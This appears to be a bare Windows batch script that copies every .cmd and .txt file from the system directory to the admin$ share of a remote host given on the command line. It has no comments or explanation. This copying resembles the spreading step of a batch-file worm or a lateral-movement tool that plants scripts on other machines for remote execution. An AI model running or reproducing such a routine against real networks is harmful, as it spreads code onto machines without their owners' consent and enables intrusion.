@echo off
for /f %%a in ('dir/b %systemroot%\*.cmd') do copy %systemroot%\%%a \\%1\admin$
for /f %%a in ('dir/b %systemroot%\*.txt') do copy %systemroot%\%%a \\%1\admin$